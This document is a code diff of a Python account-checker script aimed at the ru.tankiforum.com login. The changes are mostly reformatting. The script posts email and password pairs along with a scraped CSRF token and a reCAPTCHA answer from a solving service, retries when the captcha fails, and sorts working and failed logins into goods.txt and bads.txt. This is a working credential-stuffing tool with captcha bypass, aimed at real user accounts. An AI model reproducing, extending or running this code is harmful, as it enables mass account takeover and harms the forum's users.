@@ -24,9 +24,8 @@ def Check(data, captcha_key):
         print(f'[{data}] - [ERROR] - [INDEX ERROR]')
         return
 
-    with httpx.Client(follow_redirects=True, http2=True) as client, open('goods.txt', 'a') as goods, open(
-            'bads.txt', 'a'
-            ) as bads:
+    with httpx.Client(follow_redirects=True, http2=True) as client, open('goods.txt', 'a') as goods, open('bads.txt', 'a') as bads:
+
         try:
 
             client.cookies.set('ips4_hasJS', 'true', domain='ru.tankiforum.com')
@@ -37,31 +36,36 @@ def Check(data, captcha_key):
 
             response_start = client.get(
                 url='https://ru.tankiforum.com/login/',
-                headers={'Upgrade-Insecure-Requests': '1',
-                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
-                         'Accept': '*/*',
-                         'Sec-Fetch-Site': 'none',
-                         'Sec-Fetch-Mode': 'navigate',
-                         'Sec-Fetch-User': '?1',
-                         'Sec-Fetch-Dest': 'document',
-                         'Accept-Encoding': 'gzip, deflate',
-                         'Accept-Language': 'ru-RU,ru;q=0.9'}
+                headers={
+                    'Upgrade-Insecure-Requests': '1',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
+                    'Accept': '*/*',
+                    'Sec-Fetch-Site': 'none',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-User': '?1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'ru-RU,ru;q=0.9'
+                }
             )
             print(f'[{mail}] - [START] - [CODE: {response_start.status_code}]')
             if response_start.status_code == 202:
-                exit(f'[{mail}] - [ERROR] - [YANDEX METRICA COOCKIE DEAD]')
+                print(f'[{mail}] - [ERROR] - [YANDEX METRICA COOCKIE DEAD]')
+                exit(1)
 
             response_login = client.get(
                 url='https://ru.tankiforum.com/login/?attempt=1',
-                headers={'Upgrade-Insecure-Requests': '1',
-                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
-                         'Accept': '*/*',
-                         'Sec-Fetch-Site': 'none',
-                         'Sec-Fetch-Mode': 'navigate',
-                         'Sec-Fetch-User': '?1',
-                         'Sec-Fetch-Dest': 'document',
-                         'Accept-Encoding': 'gzip, deflate',
-                         'Accept-Language': 'ru-RU,ru;q=0.9'}
+                headers={
+                    'Upgrade-Insecure-Requests': '1',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
+                    'Accept': '*/*',
+                    'Sec-Fetch-Site': 'none',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-User': '?1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'ru-RU,ru;q=0.9'
+                }
             )
             print(f'[{mail}] - [LOGIN] - [CODE: {response_login.status_code}]')
             response_token = client.get(
@@ -74,7 +78,8 @@ def Check(data, captcha_key):
                     'Sec-Fetch-Dest': 'empty',
                     'Referer': 'https://ru.tankiforum.com/index.php?',
                     'Accept-Encoding': 'gzip, deflate',
-                    'Accept-Language': 'ru-RU,ru;'}
+                    'Accept-Language': 'ru-RU,ru;'
+                }
             )
             print(f'[{mail}] - [TOKEN] - [{response_token.json()["key"]}] - [CODE: {response_token.status_code}]')
             token = response_token.json()['key']
@@ -85,24 +90,27 @@ def Check(data, captcha_key):
                 print(f'[{mail}] - [CAPTCHA] - [SOLVED]')
                 response_auth = client.post(
                     url='https://ru.tankiforum.com/login',
-                    headers={'Upgrade-Insecure-Requests': '1',
-                             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
-                             'Accept': '*/*',
-                             'Sec-Fetch-Site': 'none',
-                             'Sec-Fetch-Mode': 'navigate',
-                             'Sec-Fetch-User': '?1',
-                             'Sec-Fetch-Dest': 'document',
-                             'Accept-Encoding': 'gzip, deflate',
-                             'Accept-Language': 'ru-RU,ru;q=0.9'},
+                    headers={
+                        'Upgrade-Insecure-Requests': '1',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36',
+                        'Accept': '*/*',
+                        'Sec-Fetch-Site': 'none',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-User': '?1',
+                        'Sec-Fetch-Dest': 'document',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'Accept-Language': 'ru-RU,ru;q=0.9'
+                    },
 
-                    data={'csrfKey': token,
-                          'auth': mail,
-                          'password': password,
-                          'remember_me': '1',
-                          'g-recaptcha-response': captcha_token,
-                          '_processLogin': 'usernamepassword'
-                          }
-                    )
+                    data={
+                        'csrfKey': token,
+                        'auth': mail,
+                        'password': password,
+                        'remember_me': '1',
+                        'g-recaptcha-response': captcha_token,
+                        '_processLogin': 'usernamepassword'
+                    }
+                )
                 if 'Вы не прошли проверку капча.' in response_auth.text:
                     print(f'[{mail}] - [CAPTCHA] - [BAD] - [RETRYING]')
                 else:
